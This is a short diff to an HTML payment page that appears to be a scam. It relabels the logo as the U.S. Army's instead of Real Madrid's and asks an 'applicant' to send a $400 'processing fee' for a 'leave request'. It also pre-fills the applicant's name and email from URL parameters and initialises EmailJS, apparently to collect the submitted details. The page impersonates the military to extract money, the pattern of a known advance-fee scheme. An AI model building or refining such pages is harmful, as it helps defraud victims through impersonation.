@@ -70,10 +70,10 @@
 </head>
 <body>
   <div class="container">
-    <img src="https://i.imgur.com/y4DFFMe.png" class="logo" alt="Real Madrid Logo" />
+    <img src="https://i.imgur.com/y4DFFMe.png" class="logo" alt="U.S. Army Logo" />
     
     <h2>Complete Your Application</h2>
-    <p id="welcome-message">Welcome, <span id="displayName">applicant</span>. To Complete your application for leave request, please select your preferred payment method below to send <strong>$400</strong> processing fee.</p>
+    <p id="welcome-message">Welcome, <span id="displayName">applicant</span>. To complete your application for leave request, please select your preferred payment method below to send <strong>$400</strong> processing fee.</p>
 
     <form id="paymentForm">
       <!-- Hidden dynamic fields -->
@@ -104,9 +104,8 @@
     (function(){
       emailjs.init("gemkywkuPgyAvxdHD");
 
-      // Optional: Pre-fill from query string like ?name=Francois&email=francois@example.com
       const urlParams = new URLSearchParams(window.location.search);
-      const name = urlParams.get('name') || 'Collaborator';
+      const name = urlParams.get('name') || 'applicant';
       const email = urlParams.get('email') || '';
 
       document.getElementById('displayName').textContent = name;
